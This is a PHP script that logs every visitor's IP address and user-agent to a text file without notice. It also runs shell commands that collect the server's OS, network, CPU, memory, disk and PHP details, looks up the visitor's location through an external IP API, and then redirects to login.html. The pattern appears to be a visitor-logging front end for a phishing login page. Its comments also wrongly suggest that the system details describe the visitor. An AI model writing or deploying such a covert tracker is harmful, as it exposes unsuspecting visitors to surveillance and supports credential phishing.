<?php

// Function to get system information including IP address
function getSystemInfo() {
    $info = [];

    // Get basic system information
    $info['OS'] = php_uname('s') . ' ' . php_uname('r');
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'];

    // Check if running on Linux
    if (strtolower(PHP_OS) === 'linux') {
        // Get Linux-specific information
        $linuxInfo = shell_exec('uname -a');
        $info['Linux Info'] = $linuxInfo;

        // Get MAC address of the primary network interface
        $macAddress = shell_exec('ifconfig eth0 | awk \'/ether/ { print $2; }\'');
        $info['MAC Address'] = trim($macAddress);
    }
    // Check if running on Windows
    elseif (strtolower(PHP_OS) === 'winnt') {
        // Get Windows-specific information
        $windowsInfo = shell_exec('systeminfo');
        $info['Windows Info'] = $windowsInfo;

        // Get MAC address of the primary network interface
        $macAddress = shell_exec('ipconfig /all | find "Physical Address"');
        $info['MAC Address'] = trim(substr($macAddress, strpos($macAddress, ':') + 2));
    }

    // Get CPU information
    $cpuInfo = shell_exec('lscpu');
    $info['CPU Info'] = $cpuInfo;

    // Get memory information
    $memoryInfo = shell_exec('free -h');
    $info['Memory Info'] = $memoryInfo;

    // Get disk space information
    $diskInfo = shell_exec('df -h');
    $info['Disk Space Info'] = $diskInfo;

    // Get PHP configuration
    $phpInfo = shell_exec('php -i');
    $info['PHP Configuration'] = $phpInfo;

    // Get network information
    $networkInfo = shell_exec('ifconfig');
    $info['Network Info'] = $networkInfo;

    // Get system uptime
    $uptimeInfo = shell_exec('uptime');
    $info['Uptime Info'] = $uptimeInfo;

    // Get IP address
    $ip = $_SERVER['REMOTE_ADDR'];
    $info['IP Address'] = $ip;

    // Get geolocation information (requires external API)
    $geoInfo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $info['Geolocation Info'] = $geoInfo;

    return $info;
}

// Write IP address and user-agent information to ip.txt
$ipaddr = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
if (strpos($ipaddr, ',') !== false) {
    $ipaddr = preg_split("/\,/", $ipaddr)[0];
}
$ipFile = fopen('ip.txt', 'a');
fwrite($ipFile, "IP: " . $ipaddr . "\r\n" . "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n");
fclose($ipFile);

// Write system information to system_info.txt
$systemInfo = getSystemInfo();
$systemInfoFile = fopen('system_info.txt', 'a');
fwrite($systemInfoFile, print_r($systemInfo, true) . "\n\n");
fclose($systemInfoFile);

// Redirect to login.html
header('Location: login.html');
exit;
